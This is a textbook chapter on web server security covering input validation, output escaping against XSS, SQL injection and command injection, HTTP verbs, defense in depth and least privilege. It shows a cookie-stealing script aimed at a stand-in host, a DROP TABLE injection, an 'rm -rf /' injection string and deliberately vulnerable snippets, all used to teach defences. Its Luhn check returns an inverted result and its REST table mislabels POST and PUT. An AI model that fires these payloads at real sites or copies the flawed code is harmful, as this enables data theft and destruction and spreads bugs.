# 4 Web server security

### In this chapter

- The importance of validating inputs sent to a web server
- How escaping control characters in output can defuse many attacks on a web server
- The correct HTTP methods to use when fetching and editing resources on a web server
- How using multiple overlapping layers of defense can help keep your web server secure
- How restricting permissions in the web server can help protect your application

[](/book/grokking-web-application-security/chapter-4/)In chapter 2, we dealt with security in the browser. In this chapter, we will look at the other end of the HTTP conversation: the web server. Web servers are notionally simpler than browsers—essentially, they are machines for reading HTTP requests and writing HTTP responses—but they are also far more common targets for hackers. A hacker can target code in a browser only indirectly—by building malicious websites or finding ways to inject JavaScript into existing ones. Web servers, on the other hand, are directly accessible to anyone who has an internet connection and a desire to cause trouble.

## Validating input

Securing a web server starts at the server boundaries. Most attempts to attack your web server arrive as maliciously crafted HTTP requests sent from scripts or bots, probing your server for vulnerabilities. Protecting yourself against these threats should be a priority. Such attacks can be mitigated by validating HTTP requests as they arrive and rejecting any that look suspicious. Let’s look at a few methods.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

### Allow lists

In computer science, an *allow list* is a list of valid inputs to a system. When taking input from an HTTP request, checking it against an allow list (and rejecting the HTTP request if the value isn’t in the list) is the safest possible way to validate input.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

You are effectively enumerating all the permitted input values ahead of time, preventing an attacker from supplying an invalid (and potentially malicious) value for that input. Here’s how you might validate an HTTP parameter in Ruby:

```
input_value = 'GBP'

raise StandardError, "Invalid currency!"
  unless %w[USD EUR JPY].include?(input_value)          #1
```

Allow lists can be applied to other parts of the HTTP request, too. Some sensitive web applications can lock down access for particular accounts by Internet Protocol (IP) address, so using allow lists to check IP addresses is a common approach.

Allow lists are the gold standard for input validation, and you should use them whenever doing so is feasible. Not all inputs can be validated in this fashion, so let’s look at some more flexible methods of validation.

### Block lists

For many types of input, you cannot specify all the values ahead of time. If somebody signs up on your site and supplies their email address, for example, your code won’t have a list of all the world’s email addresses. Instead, you may want to implement a *block list*—a list of values that are explicitly banned.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

This strategy offers much less protection than an allow list; you can’t imagine every conceivable malicious input in most cases. But it’s handy as a last resort:

```
input_value = 'a_darn_shame'

profanities = %w[darn heck frick shoot]

if profanities.any? { |profanity| input_value.include?(profanity) }    #1
  raise StandardError.new 'Bad word detected!'
end
```

The block list is a powerful technique if you need an easy way to enumerate harmful input values, particularly if they are drawn from configuration and can be updated without redeploying the code.

### Pattern matching

If an allow list isn’t feasible, the most secure approach is to ensure that each HTTP input matches an expected pattern. Because most HTTP parameters arrive as strings of text, this approach means checking whether each parameter value has the following characteristics:[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

-  Is greater than minimal length (to ensure that a username has more than three characters, for example)
-  Is less than a maximum length (so that a hacker cannot cram the entire text of *Moby Dick* into the username field)
-  Contains only expected characters in an expected order

The following figure shows some validations you might apply when accepting a date input.

[](/book/grokking-web-application-security/chapter-4/)Pattern matching is a helpful way of protecting against malicious and unforeseen inputs. If you can restrict HTTP parameters to alphanumeric characters, for example, you can ensure that the inputs don’t contain *metacharacters*—characters that may have special meaning when passed to a downstream system like a database. The following Ruby code will replace all nonalphanumeric characters with the underscore character (the trailing `/i` tells Ruby to ignore the case):

```
input_value = input_value.gsub(/[^0-9a-z]/i, '_')
```

The malicious injection of metacharacters into HTTP parameters is the basis of a whole range of *injection attacks*, which allow an attacker to relay malicious code to a database or the operating system through the web server. We’ll look at some injection attacks in the next section.

##### Using regex for validation

It’s often useful to validate inputs with *regular expressions*—*regex*, for short—a way of describing the permissible characters and their ordering. Regexes can be used to ensure that email addresses are in a valid format, dates are well formed, and IP addresses are believable, for example, as spelled out in the following minitable.[](/book/grokking-web-application-security/chapter-4/)

![](https://drek4537l1klr.cloudfront.net/mcdonald/Figures/04-03_t1.png)

### Further validation

[](/book/grokking-web-application-security/chapter-4/)The more input validation you perform, the more secure your web server will be, so often, it’s good to go beyond simple pattern matching. It pays to do some research on how best to validate specific data points. The last digit of a credit card, for example, is calculated by the Luhn algorithm and can be used to reject invalid numbers immediately, as illustrated by this Python code:[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

```
def is_valid_credit_card_number(card_number):
 def digits_of(n):
   return [int(d) for d in str(n)]

 digits      = digits_of(card_number)
 odd_digits  = digits[-1::-2]
 even_digits = digits[-2::-2]
 checksum    = sum(odd_digits)
 
 for d in even_digits:
   checksum += sum(digits_of(d*2))

 return bool(checksum % 10)
```

Many programming languages have well-established packages that allow for a wide range of validation of data types. Use these packages whenever you can; they tend to be maintained by experts who will have thought through all the weird, unexpected cases. In Python, for example, you can use the `validators` library to validate everything from URLs to *message authentication code* (MAC) addresses:

```
import validators

validators.url("https://google.com")
validators.mac_address("01:23:45:67:ab:CD")
```

### Email validation

[](/book/grokking-web-application-security/chapter-4/)If a user has supplied an email address that appears to be valid, do not assume that they have access to the corresponding email account. (If the address is not valid, however, you can usefully complain that the user mistyped it and ask them to reenter the address.)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

An email address should be marked as unconfirmed until you have sent an email and received proof of receipt. Even if an email appears to be valid—that is, it has an `@` symbol in the middle and the second half corresponds to an internet domain hosting a mail exchange record in the Domain Name System (DNS)—you still can’t be sure that the user who’s entering the email on your site has control of that address. The only way to be certain is to generate a strongly random token, send a link with that token to the email address, and ask the recipient to click that link.

[](/book/grokking-web-application-security/chapter-4/)

### Validating file uploads

Files uploaded to a web server are usually written to disk in some fashion, so they are favorite tools for hackers. Uploaded files are tricky input to validate because they arrive as a stream of data and are often encoded in a binary format.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

If you accept file uploads, at a bare minimum, you must (a) validate the file type by checking the file headers and (b) limit the maximum size of the file. You should also check for valid filename extensions, but remember that an attacker can name the file anything they choose, so the file extension can be misleading.

Here’s how you would use the `Magic` library (a wrapper for the Linux utility `libmagic`) to detect file types in Python:[](/book/grokking-web-application-security/chapter-4/)

```
import magic

file_type = magic.from_file("upload.png", mime=True)

assert file_type == "image/png"
```

##### Client-side validation

In chapter 2, we saw how JavaScript can use the File API to check the size and content type of a file. JavaScript can also validate form fields, and HTML itself has several built-in validations for text entry:

```
const email = document.getElementById("email")

email.addEventListener("input", (event) => {
 if (email.validity.typeMismatch) {
   email.setCustomValidity("This is not a valid email address!")
   email.reportValidity()
 } else {
   email.setCustomValidity("")
 }
})
```

This type of client-side validation (and dedicated types of input fields for specific data types) gives immediate feedback to the user but provides no security to your web server. Hackers generally won’t send requests from a browser; instead, they’ll use scripts or bots. You must implement validation on the server side to guarantee security. When that validation is in place, you can use client-side validation to improve the user experience.

Validating files for malicious content is a difficult task, as we shall see in chapter 11, and simple file header checks like the ones illustrated in the preceding code sample merely scratch the surface. Often, it’s better to store files in a third-party *content management system* (CMS) or a web storage solution like Amazon’s *Simple Storage Service* (S3) to keep the files at arm’s length.[](/book/grokking-web-application-security/chapter-4/)

## Escaping output

In the preceding section, we saw how important it is to validate input to a web server because malicious HTTP requests can cause unintended consequences in your applications. (Well, unintended by you; hackers very much intend to achieve them.) It’s equally important to be strict about the *output* from your web server, whether that output is the contents of your HTTP responses or commands that you send to other systems (such as databases, log servers, or the operating system).[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Being strict about output means *escaping* the output sent to the downstream system, replacing metacharacters that have a special meaning to that system with an *escape sequence* that tells the downstream system something like this: “There was a `<` character here, but don’t treat it as the start of an HTML tag.” As usual, this concept is better illustrated by example, so let’s look at three key contexts in which escaping output is vital for keeping your server secure.[](/book/grokking-web-application-security/chapter-4/)

### Escaping output in the HTTP response

[](/book/grokking-web-application-security/chapter-4/)A common form of attack on the internet is cross-site scripting (XSS), wherein an attacker injects malicious JavaScript into a web page being viewed by another user. In chapter 2, we learned some ways to mitigate the risks of XSS in the browser, but the most important protections need to be implemented on the server. These protections require you to escape any dynamic content written to HTML.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Let’s review the attack vector to gain a little more context. A typical XSS attack happens as follows:

1.  The attacker finds some HTTP parameter that is designed to be stored in the database and displayed as dynamic content on a web page. This parameter might contain a comment on a social media site or a username.
1.  The attacker, knowing that they now have control of this “untrusted input,” submits some malicious JavaScript under this input:

```
POST /article/12748/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
comment=<script>window.location=
 'haxxed.com?cookie='+document.cookie</script>
```

1.  Another user views the page where this untrusted input is displayed. The `<script>` tag is written in the HTML of the web page:

```
<div class="comments">
 <p class="comment">
   <script>
     window.location='haxxed.com?cookie='+document.cookie
   </script>
 </p>
</div>
```

1.  The malicious script is executed in the victim’s browser. This script can cause all sorts of problems. A popular approach is to send the user’s cookies to a remote server that’s controlled by the attacker, as in the preceding example.

[](/book/grokking-web-application-security/chapter-4/)The key to protecting against XSS is ensuring that any untrusted content—any content potentially entered by an attacker—is escaped as it is written out on the other end. Specifically, this approach means replacing metacharacters with their corresponding escape sequences:

```
<div class="comments">
 <p class="comment">
   &lt;script&gt;
     window.location='haxxed.com?cookie='+document.cookie
   &lt;/script&gt;
 </p>
</div>
```

Escape sequences will be rendered visually as their unescaped counterparts (so `&lt;` will display as `<` on the screen), but the HTML parser will not see them starting or ending an HTML tag. The following figure shows the full list of escape sequences needed for HTML.

[](/book/grokking-web-application-security/chapter-4/)Dynamic HTML pages are usually rendered by means of *templates*, which intersperse dynamic content with HTML tags. Most template languages escape dynamic content by default because of the risks of XSS. The following snippet shows how a malicious JavaScript input will be escaped safely in the popular Python templating language Jinja2:[](/book/grokking-web-application-security/chapter-4/)

```json
{{ "<script>" }}
```

This snippet outputs `&lt;script&gt;` to the HTML of the HTTP response, safely defusing XSS attacks. To enable an XSS attack, you would have to disable escaping explicitly, as follows:

```json
{{ "<script>" | safe }}
```

This code will output `<script>` in the HTML, which is not safe. Make sure that you know how your template language of choice performs escaping and how to spot when escaping has been disabled. Also, be careful when writing any helper functions that output HTML for injection into a downstream template, *especially* if they take dynamic inputs that are under the control of an attacker. HTML strings constructed outside templates are often overlooked in security reviews.

### Escaping output in database commands

[](/book/grokking-web-application-security/chapter-4/)Failure to safely escape characters being inserted into SQL commands will make you vulnerable to SQL injection attacks.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Most web applications communicate with some sort of data store, which generally means that your code will end up constructing a database command string from input supplied in the HTTP request. A classic example is looking up a user account in a SQL database when a user logs in. This scenario is another one where untrusted input is written to an output in which particular characters have special meaning. The security consequences can be horrible.[](/book/grokking-web-application-security/chapter-4/)

Let’s look at a concrete example of this type of attack. Observe the following Java code snippet, which connects to a SQL database and runs a query:

```
Connection conn = DriverManager.getConnection(
  URL, USER, PASS);                                    #1
Statement  stmt = conn.createStatement();

String sql = 
  "SELECT * FROM users WHERE email = '" + email + "'"; #2

ResultSet results = stmt.executeQuery(sql);            #3
```

[](/book/grokking-web-application-security/chapter-4/)With this codebase looking up the user as written, an attacker can supply the `email` parameter as `'; DROP TABLE USERS` and perform a *SQL injection* attack. Here is the actual SQL expression that will get executed on the database:[](/book/grokking-web-application-security/chapter-4/)

```
SELECT * FROM users WHERE email = ''; DROP TABLE USERS --'
```

The `'` and `;` strings have special meaning in SQL: the former closes a string, and the latter allows multiple SQL statements to be concatenated. As a result, supplying the malicious parameter value will delete the `USERS` table from the database. (Deletion of data is probably the best-case scenario. Generally, SQL injection attacks are used to steal data, and you may never know that the attacker has infiltrated your system.) The following figure shows how to protect against this type of attack.

[](/book/grokking-web-application-security/chapter-4/)This method escapes the characters in the input that have special meaning before inserting them into a SQL query. This task is best achieved by using *parameterized statements* on the database driver, supplying the SQL command and the dynamic arguments to be bound in separately, and allowing the driver to safely escape the latter:[](/book/grokking-web-application-security/chapter-4/)

```
Connection conn = DriverManager.getConnection(
  URL, USER, PASS);
String     sql  = "SELECT * FROM users WHERE email = ?";

PreparedStatement stmt = conn.prepareStatement(sql); #1

statement.setString(1, email);                       #2

ResultSet results = stmt.executeQuery(sql);          #3
```

Under the hood, the driver will safely replace any characters with their escaped counterparts, removing an attacker’s ability to launch the SQL injection.

### Escaping output in command strings

[](/book/grokking-web-application-security/chapter-4/)SQL injection attacks have a counterpart in code that calls out to the operating system. Failure to escape characters being inserted into operating system commands will make you vulnerable to command injection attacks.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Operating system calls are generally achieved by using a command-line call, as illustrated in this Python snippet:

```
from subprocess import run

response = run("cat " + input_value, shell=True)
```

Here, if the `input_value` is from an untrusted source, this code allows an attacker to run arbitrary commands against the operating system.

Depending on which operating system you are running on, certain characters sent to the operating system have special meaning. In this example, an attacker can send the HTTP argument `file.txt && rm -rf /` and execute a command on the underlying operating system:

```
cat file.txt && rm -rf /
```

[](/book/grokking-web-application-security/chapter-4/)This command string performs two separate operations on Linux because the `&&` syntax is a way of chaining two commands. The first operation, `"cat file.txt"`, reads in the value of the file `file.txt`, which presumably is what the author of the application intends. The second command, `"rm -rf /"`, deletes *every file on the server.*

As you can see, being able to inject the `&&` characters into the command-line operation gives the attacker a way to run *any* command on your operating system, which is a nightmare scenario. Deleting every file on the server isn’t even the worst thing that could happen: an attacker might deploy malware or use this server as a jumping-off point for attacking other servers on your network. Again, the way to protect against this type of attack is to use character escaping.

[](/book/grokking-web-application-security/chapter-4/)Most languages have higher-level APIs that allow you to talk to the operating system without constructing commands explicitly. It’s generally preferable to use these APIs in place of their lower-level counterparts because they take care of escaping control characters for you. The functionality that uses the `subprocess` module could better be performed with the `os` module in Python, which has functions that read files safely in a much more natural manner.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

If you end up constructing your own command-line calls, you need to perform the escaping yourself. This task can be fraught with complications because control characters vary between Windows and UNIX-based operating systems. Try to use an established library that will take care of the edge cases safely. In Python, happily enough, it’s generally enough to set the `shell` parameter to `False` when using the `subprocess` module. This code tells the `subprocess` module to escape metacharacters:[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

```
from subprocess import run

response = run(["cat", input_value], shell=False)
```

## Handling resources

Not every HTTP request poses the same threat, so security-wise, you should assign the appropriate type of HTTP request to the appropriate server-side action. The HTTP specification describes several *verbs* or *methods*, one of which must be included in the HTTP request. Because attackers can trick users into triggering certain types of HTTP requests, you must know which verb to use for what type of action. Let’s briefly review the main HTTP verbs.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Clicking a hyperlink or pasting an address in the browser’s URL will trigger a `GET` request:[](/book/grokking-web-application-security/chapter-4/)

```
GET /home HTTP/2.0
Host: www.example.com
```

`GET` requests are used to retrieve a resource from a server, and as you might expect, `GET` is (by far) the most commonly used HTTP verb. `GET` requests do not contain a request body; all the information supplied to describe the resource is in the URI supplied with the request.

`POST` requests are used to create resources on the server and can be generated by HTML forms such as one you might use to log in to a website. A form like

```
<form action="/login" method="POST">
 <label form="name">Email</label>
 <input type="text" id="email" name="email" />
 
 <label form="password">Password</label>
 <input type="password" id="password" name="password" />
 
 <button type="submit">Login</button>
</form>
```

would generate an HTTP request as follows:

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
email=user@gmail.com&password=topsecret123
```

`GET` requests and `POST` requests can also be made from JavaScript. Here, we use the `fetch` API to initiate a `GET` request:[](/book/grokking-web-application-security/chapter-4/)

```javascript
fetch("http://example.com/movies.json")
 .then((response) => response.json())
 .then((data) => console.log(data))
```

[](/book/grokking-web-application-security/chapter-4/)`DELETE` requests are used to request the deletion of a resource on the server, whereas `PUT` requests are used to add a new resource on the server. These types of requests can be generated *only* from JavaScript. The following figure shows the appropriate use of each HTTP verb.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Now, some words of warning: as the author of the server and client-side code that make up the web application, you are free to use whatever HTTP verbs you want to perform whatever action you choose. The internet is a graveyard of bad technology decisions, and some sites use `POST` requests for navigation or `GET` requests to change the state of a resource on a server.

Using a `GET` request to change server state is a security risk. Suppose that you allow a user to delete their account with a `GET` request. Here, we are using the Flask server in Python and mapping a `GET` request to the `/profile/delete` path to the (sensitive) account deletion function:

```
@app.route('/profile/delete', methods=['GET'])
def delete_account():
 user = session['user']
 
 with database() as db:
   db.execute('delete from users where id = ?', user['id'])
   del session['user']
       
 return redirect('/')
```

As a result, a hacker has an easy way to perform a cross-site request forgery (CSRF) attack. If they share a link to the account deletion URL and disguise that link as something else, they can trick a user into deleting *their own account.* For this reason, `GET` requests must be used only to retrieve resources—*not* to update state on the server.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

## Representation State Transfer (REST)

Mapping each action your users can perform to an appropriate HTTP verb is part of a larger architectural design philosophy called *Representational State Transfer* (REST). REST is used mostly for the design of web services but can help keep the design of traditional web applications clean and secure, too. This approach is especially true of rich applications that use a lot of JavaScript to render pages because such applications frequently make asynchronous HTTP requests to the server, and you end up having to organize these requests into an API. REST has several good ideas that you should apply to your code:[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

-  Each resource should be represented by a single path, such as `/books` to get a list of all books or `/books/9780393972832` to retrieve details on a single book (by International Standard Book Number, in this case).
-  Each resource locator should be a *clean URL* free of implementation details. You may have seen script names like `login.php` on older websites; this type of information leakage gives an attacker a clue about what technology you are using. (Chapter 13 discusses other ways that your application can leak your technology stack.)[](/book/grokking-web-application-security/chapter-4/)
-  Retrieving, adding, updating, or deleting a resource should be performed by the appropriate HTTP verb.

[](/book/grokking-web-application-security/chapter-4/)Following these rules will result in secure, predictable organization of your code. Typical RESTful APIs look like the following, which is logically consistent and intuitive in its design.

Request

Action

`GET /books`

Retrieves a list of books

`GET /books/9780393972832`

Retrieves a specific book

`POST /books/38429`

Creates a book

`PUT /books`

Edits a particular book

`DELETE /books/9780393972832`

Deletes a specific book

## Defense in depth

A popular pastime for people in the Middle Ages was murdering one another with swords. To avoid getting murdered in this way, wealthy lords built castles to protect against marauding armies. These castles often featured multiple perimeter walls, moats, and drawbridges that could be drawn up in the event of a siege. Then the local warlord would hire sturdy soldiers to man the battlements, shoot arrows at attackers, pour boiling oil on them, and perform other murderous actions.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Treat your web server like a medieval castle. Implementing multiple overlapping layers of defense ensured that should one layer fail (if the front gate was breached by a battering ram, for example), the attacker still had to contend with the next layer (highly motivated defenders shooting crossbows). This concept is *defense in depth*.[](/book/grokking-web-application-security/chapter-4/)

For every vulnerability we describe in the second half of this book, we will generally show multiple ways of defending against them. Use as many of these protective techniques as possible. Employing multiple layers of defense allows for the occasional (and inevitable) lapse of security in one domain because another layer of security will prevent the vulnerability from being exploited.

Defense in depth looks different depending on the vulnerability you’re defending against. To defend against injection attacks, for example, you should complete every action in this list:

-  Use parameterized statements when connecting to the database.
-  Validate all inputs coming from the HTTP request against an allow list, using pattern matching, or against a block list.
-  Connect to the database as an account with limited permissions.
-  Validate that each response from each database call has the expected form.
-  Implement logging of the database calls and monitor for unusual activity.

## The principle of least privilege

The twin principle of defense in depth is the *principle of least privilege*, which states that each software component and process is given the minimum set of permissions to achieve what it is intended to do. To illustrate this concept a little further, let’s reach for an analogy.[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)[](/book/grokking-web-application-security/chapter-4/)

Suppose that you are head of security at an airport. People have to follow a lot of rules at an airport. International travelers must pass through passport control, whereas domestic travelers are permitted to progress directly to baggage claim. Pilots are permitted to board planes and enter the cabin—a privilege that passengers don’t have. Maintenance staff and ground crew who are wearing a special tag are permitted to access secure areas after they pass through security checks.

The point is that every employee and customer at the airport is permitted to perform a set number of actions, but nobody has unlimited permissions. Even the CEO of the airport isn’t allowed to bypass passport control after returning from an overseas trip.

Think through how to apply the principle of least privilege to your web application. This task can involve any of the following things:

-  Restricting the permissions of JavaScript code executing in the browser by preventing access to cookies and setting a content security policy (CSP).[](/book/grokking-web-application-security/chapter-4/)
-  Connecting to a database under an account with limited permissions. This account might require read-write privileges but should not be allowed to change table structures.
-  Running your web server process as a nonroot user that has access only to the directories required to access assets, configuration, and code.

Employing the principle of least privilege ensures that any attacker who overcomes your security measures can do only a minimal amount of damage. If an attacker can inject code into your web pages, making your cookies inaccessible to JavaScript code may still save the day.

## Summary

-  Validate all inputs to your web server—preferably by checking against an allow list. If that approach fails, perform pattern matching. As a last resort, implement block lists.
-  Email addresses should be validated by sending a confirmation token in a hyperlink and requiring the user to click it.
-  Untrusted input incorporated into the HTTP response, database commands, or operating system commands should be escaped.
-  Calls to databases should be performed by means of parameterized statements, which will escape malicious strings safely.
-  Ensure that your `GET` requests do not change state on the server; otherwise, your users will fall victim to CSRF attacks.
-  Employing RESTful principles will ensure that your URLs are cleanly organized and secure.
-  Implementing defense in depth—building multiple, overlapping layers of security—will ensure that a temporary security lapse in one area cannot be exploited in isolation.
-  Implementing the principle of least privilege—allowing each software component and process only the minimal permissions it needs to do its job—will mitigate the harm an attacker can do if they manage to overcome your defenses.[](/book/grokking-web-application-security/chapter-4/)
